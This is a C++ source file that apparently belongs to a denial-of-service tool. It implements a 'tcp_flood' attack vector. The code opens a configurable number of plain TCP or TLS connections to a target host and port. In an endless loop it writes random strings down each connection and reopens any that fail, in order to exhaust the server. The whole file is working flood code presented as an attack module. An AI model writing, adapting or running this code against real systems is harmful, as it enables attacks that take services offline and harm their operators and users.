#include "tcp_flood.h"
#include "utils.h"
#include "socket.h"
#include "ssocket.h"

void tcp_flood::run() {

    std::vector<std::unique_ptr<Socket>> sockets{};
    sockets.reserve(config->conn);
    std::string hdr{};
    int len = 0;
    for(int i = 0; i < config->conn; ++i){
        if(config->tls){
            sockets.emplace_back(std::unique_ptr<Socket>(new Ssocket(config->rhost.c_str(), config->rport.c_str())));
        }else{
            sockets.emplace_back(std::unique_ptr<Socket>(new Socket(config->rhost.c_str(), config->rport.c_str(), SOCK_STREAM)));
        }
    }


    while(true) {
        for(int i = 0; i < config->conn; ++i) {
            if(!sockets[i]->Alive())
                sockets[i]->Open();
            len = gen_hdr(hdr);
            if(sockets[i]->Write(hdr.c_str(), len) == -1){
                sockets[i]->Close();
                sockets[i]->Open();
            }
        }
        utils::pause(config->time);
    }




}

int tcp_flood::gen_hdr(std::string &string) {
    utils::randomizer::randomstr(string);
    return static_cast<int>(string.length());
}

tcp_flood::tcp_flood(std::shared_ptr<Config> config) : Vector(std::move(config)){

}
